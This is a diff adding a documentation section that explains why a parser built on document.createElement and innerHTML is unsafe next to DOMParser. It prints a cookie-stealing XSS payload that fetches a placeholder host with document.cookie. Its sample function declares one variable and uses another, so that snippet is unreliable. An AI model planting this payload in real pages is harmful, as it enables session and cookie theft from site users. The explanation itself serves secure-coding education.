@@ -163,6 +163,23 @@ setParser({
 const sanitizer = new PurifyHTML();
 // ...
 ```
+---
+## why not ```document.createElement(...)```
+
+Because by processing the string like this:
+```javascript
+const parse = (str) => {
+  const node = document.createElement('div');
+  div.innerHTML = str;
+  
+  return div;
+}
+```
+
+In fact, this function, having received a special payload, will RUN it. The following payload will send a network request:
+`<img/src/onerror="fetch('www.site.com?q='+encodeURI(document.cookie)">`
+
+And in the case of using DOMParser, the code does not run.
 
 ---
 
